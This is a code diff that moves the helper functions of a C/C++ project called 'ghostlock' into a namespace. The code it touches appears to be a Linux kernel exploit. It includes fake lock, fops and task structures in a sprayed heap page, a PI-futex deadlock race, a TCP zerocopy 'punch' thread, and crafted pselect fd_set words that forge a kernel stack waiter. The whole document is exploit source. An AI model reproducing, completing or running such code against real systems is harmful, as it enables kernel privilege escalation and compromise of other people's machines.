@@ -17,6 +17,8 @@
 #include "routes/select_stack_route.h"
 #include "routes/tcp_zerocopy_route.h"
 
+namespace ghostlock::route {
+
 /* Decoupling plan: route-local elapsed-time helper. Input: monotonic reference;
  * output: elapsed milliseconds. Future: shared_elapsed_ms(const timespec *);
  * move to the stateless time helper module and make the input const. */
@@ -158,7 +160,7 @@ int kernel5_resident_start(void) {
             atomic_load(&context->owner_has_lock1) &&
             atomic_load(&context->waiter_waiting) &&
             atomic_load(&context->owner_waiting))) {
-        if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
+        if (ghostlock::route::fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
             return 0;
         sched_yield();
     }
@@ -171,7 +173,7 @@ int kernel5_resident_start(void) {
     if (r >= 0 || (errno != EDEADLK && errno != EDEADLOCK)) return 0;
     clock_gettime(CLOCK_MONOTONIC, &ready_started);
     while (!atomic_load(&context->waiter_ready) &&
-            fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
+            ghostlock::route::fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
         sched_yield();
     if (!atomic_load(&context->waiter_ready) ||
             multicast_waiter_adjust(context) < 0)
@@ -401,6 +403,8 @@ static void *tcp_punch_thread(void *arg) {
 
 /* Acquire every userspace resource owned by the TCP route. No PI consumer or
  * punch operation is armed until this function has completed successfully. */
+}  // namespace ghostlock::route
+
 int ghostlock::TcpZerocopyRoute::prepare() noexcept {
     if (!(g_heap_context.current.base) || !(g_heap_context.current.fake_lock) || !(g_heap_context.current.fake_fops)) {
         pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
@@ -408,7 +412,7 @@ int ghostlock::TcpZerocopyRoute::prepare() noexcept {
         return fail(40, 0);
     }
 
-    if (tcp_make_pair(this) != 0) {
+    if (ghostlock::route::tcp_make_pair(this) != 0) {
         pr_warning("tcp route pair setup failed errno=%d\n", errno);
         return fail(41, errno);
     }
@@ -437,7 +441,7 @@ int ghostlock::TcpZerocopyRoute::prepare() noexcept {
     atomic_store(&race->consumer_go, 0);
     atomic_store(&race->consumer_calls, 0);
     atomic_store(&race->consumer_success, 0);
-    int thread_error = punch_worker.start(tcp_punch_thread, this);
+    int thread_error = punch_worker.start(ghostlock::route::tcp_punch_thread, this);
     if (thread_error != 0) {
         pr_warning("tcp route punch thread errno=%d\n", thread_error);
         return fail(44, thread_error);
@@ -509,7 +513,7 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
             for (int spin = 0; spin < post_hold; spin++) {
                 __asm__ volatile("yield":: : "memory");
             }
-            tcp_wait_for_consumer_idle(this);
+            ghostlock::route::tcp_wait_for_consumer_idle(this);
         }
 
         int calls = atomic_load(&race->consumer_calls);
@@ -534,6 +538,8 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
     }
     return status;
 }
+
+namespace ghostlock::route {
 
 /* Public compatibility entry: lifecycle is now explicitly ordered while the
  * common route dispatcher remains scheduled for S14. */
@@ -602,13 +608,13 @@ static int pselect_put_global_word(
     int word_idx = global_word % words_per_set;
     switch (set_idx) {
         case 0:
-            fdset_put_word(in, word_idx, value);
+            ghostlock::route::fdset_put_word(in, word_idx, value);
             return 1;
         case 1:
-            fdset_put_word(out, word_idx, value);
+            ghostlock::route::fdset_put_word(out, word_idx, value);
             return 1;
         case 2:
-            fdset_put_word(ex, word_idx, value);
+            ghostlock::route::fdset_put_word(ex, word_idx, value);
             return 1;
         default:
             return 0;
@@ -629,8 +635,8 @@ static int pselect_waiter_shift(const SelectStackRouteContext *context) {
 static void pselect_put_waiter_word(
         SelectStackRouteContext *context, int words_per_set,
         int waiter_word, uint64_t value, const char *name) {
-    int global_word = pselect_waiter_shift(context) + waiter_word;
-    int placed = pselect_put_global_word(
+    int global_word = ghostlock::route::pselect_waiter_shift(context) + waiter_word;
+    int placed = ghostlock::route::pselect_put_global_word(
             context->input_set.raw(), context->output_set.raw(),
             context->exception_set.raw(),
             words_per_set, global_word, value);
@@ -693,7 +699,7 @@ static void restore_standard_io(const ghostlock::BorrowedFd backup[3]) {
 
 /* Decoupling plan: build the compact/tree select-stack waiter image. Inputs:
  * profile, payload layout and write request; output: three fd_sets. Future:
- * select_stack_build_fdsets(profile, payload, request, result). */
+ * ghostlock::route::select_stack_build_fdsets(profile, payload, request, result). */
 static void select_stack_build_fdsets(SelectStackRouteContext *context) {
     ghostlock::FdSet *in = &context->input_set;
     ghostlock::FdSet *out = &context->output_set;
@@ -731,7 +737,7 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
         };
         for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
             struct pselect_waiter_word *w = &words[i];
-            pselect_put_waiter_word(context, words_per_set,
+            ghostlock::route::pselect_put_waiter_word(context, words_per_set,
                     w->word, w->value, w->name);
         }
     } else {
@@ -753,11 +759,13 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
         };
         for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
             struct pselect_waiter_word *w = &words[i];
-            pselect_put_waiter_word(context, words_per_set,
+            ghostlock::route::pselect_put_waiter_word(context, words_per_set,
                     w->word, w->value, w->name);
         }
     }
 }
+
+}  // namespace ghostlock::route
 
 int ghostlock::SelectStackRoute::prepare() noexcept {
     if (!(g_heap_context.current.base) || !(g_heap_context.current.fake_lock) || !(g_heap_context.current.fake_fops)) {
@@ -786,23 +794,23 @@ int ghostlock::SelectStackRoute::prepare() noexcept {
         return fail(32, errno);
     }
 
-    select_stack_build_fdsets(this);
+    ghostlock::route::select_stack_build_fdsets(this);
     pr_info("pselect route setup shift=%d page=%016zx "
             "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
             "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
             "ex1=%016llx ex2=%016llx ex3=%016llx\n",
-            pselect_waiter_shift(this),
+            ghostlock::route::pselect_waiter_shift(this),
             (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_w0), (g_heap_context.current.fake_task),
-            (unsigned long long) fdset_get_word(input_set.raw(), 0),
-            (unsigned long long) fdset_get_word(input_set.raw(), 3),
-            (unsigned long long) fdset_get_word(output_set.raw(), 0),
-            (unsigned long long) fdset_get_word(exception_set.raw(), 0),
-            (unsigned long long) fdset_get_word(exception_set.raw(), 1),
-            (unsigned long long) fdset_get_word(exception_set.raw(), 2),
-            (unsigned long long) fdset_get_word(exception_set.raw(), 3));
+            (unsigned long long) ghostlock::route::fdset_get_word(input_set.raw(), 0),
+            (unsigned long long) ghostlock::route::fdset_get_word(input_set.raw(), 3),
+            (unsigned long long) ghostlock::route::fdset_get_word(output_set.raw(), 0),
+            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 0),
+            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 1),
+            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 2),
+            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 3));
 
     /* The route may replace low fds, including stdout and stderr. */
-    open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
+    ghostlock::route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
             high_read.get(), pipe_write.get());
     owned_input_set = input_set;
     owned_output_set = output_set;
@@ -819,13 +827,13 @@ RouteStatus ghostlock::SelectStackRoute::execute() noexcept {
     atomic_store(&race->consumer_calls, 0);
     atomic_store(&race->consumer_success, 0);
     atomic_store(&race->consumer_stop, 0);
-    int delay_usec = route_delay_usec(this, 1);
+    int delay_usec = ghostlock::route::route_delay_usec(this, 1);
     atomic_store(&race->route_delay_usec, delay_usec);
     atomic_store(&race->consumer_go, 1);
 
     pr_info("pselect pre-select compact=%d +%.0fms\n",
             layout.compact_waiter,
-            fops_elapsed_ms(&route_t0));
+            ghostlock::route::fops_elapsed_ms(&route_t0));
     errno = 0;
     if (layout.compact_waiter) {
         uint32_t timeout_us = execution->select_timeout_us;
@@ -847,9 +855,9 @@ RouteStatus ghostlock::SelectStackRoute::execute() noexcept {
                 exception_set.raw(), &timeout);
     }
     select_errno = errno;
-    restore_standard_io(stdio_backup);
+    ghostlock::route::restore_standard_io(stdio_backup);
     pr_info("pselect post-select compact=%d +%.0fms ret=%d\n",
-            layout.compact_waiter, fops_elapsed_ms(&route_t0),
+            layout.compact_waiter, ghostlock::route::fops_elapsed_ms(&route_t0),
             select_result);
     atomic_store(&race->consumer_go, 0);
 
@@ -864,6 +872,8 @@ RouteStatus ghostlock::SelectStackRoute::execute() noexcept {
     }
     return status;
 }
+
+namespace ghostlock::route {
 
 RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
     /* TODO(post-S15:SELECT-01): Compact outer retries must
@@ -891,3 +901,5 @@ RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
             context.status.error_number);
     return context.status;
 }
+
+}  // namespace ghostlock::route
